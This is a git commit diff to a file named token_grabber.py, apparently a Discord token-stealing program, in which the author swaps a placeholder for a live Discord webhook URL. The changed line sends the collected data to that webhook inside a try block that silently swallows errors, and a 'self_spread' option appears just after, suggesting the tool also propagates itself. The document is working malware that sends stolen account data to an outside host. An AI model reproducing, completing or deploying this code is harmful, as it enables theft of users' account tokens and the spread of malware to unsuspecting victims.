ef0b59db9599ef813baa83cafb3dd7f021027705
ZalCeGG <105364099+ZalCeGG@users.noreply.github.com>
2022-05-30 19:26:02 +1000

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/980051989327126548/o6Oa7w5P6rRTGTDX1fhz-hFWEvjj6THhDI3XAels-4R3hhct3Bydrs0stOZy017rhb4x", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
